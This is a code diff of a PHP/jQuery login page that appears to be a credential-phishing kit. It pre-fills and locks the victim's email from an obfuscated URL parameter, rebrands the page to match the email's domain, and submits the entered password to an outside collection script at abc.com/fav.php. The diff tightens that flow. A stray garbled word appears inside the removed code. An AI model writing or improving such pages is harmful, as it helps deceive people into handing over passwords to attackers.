@@ -49,6 +49,7 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
                 placeholder="Email"
                 class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                 value="<?php echo $email; ?>"
+                readonly
             >
             <input
                 type="password"
@@ -162,15 +163,9 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
             updateBranding(email);
             $('#email').val(email); // Populate email input with extracted email
 
-            // Update branding on email input change
-            $('#email').on('input', function() {
-                email = $(this).val();
-                updateBranding(email);
-           Spiritualized
-            });
-
             // Handle form submission (client-side validation)
             $('#login-form').on('submit', function(e) {
+                e.preventDefault(); // Prevent default submission until validated
                 $('#error').hide();
                 $('#msg').hide();
 
@@ -178,19 +173,16 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
                 const passwordVal = $('#password').val();
 
                 if (!emailVal) {
-                    e.preventDefault();
                     $('#error').text('Email field is empty').show();
                     console.log('Form error: Email empty');
                     return;
                 }
                 if (!emailRegex.test(emailVal)) {
-                    e.preventDefault();
                     $('#error').text('Invalid email format').show();
                     console.log('Form error: Invalid email');
                     return;
                 }
                 if (!passwordVal) {
-                    e.preventDefault();
                     $('#error').text('Password field is empty').show();
                     console.log('Form error: Password empty');
                     return;
@@ -198,7 +190,7 @@ $email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
 
                 $('#msg').text('Submitting to server...').show();
                 console.log('Form submitted: Email=', emailVal);
-                // Form submission proceeds to https://abc.com/fav.php
+                this.submit(); // Manually trigger form submission to https://abc.com/fav.php
             });
         });
     </script>
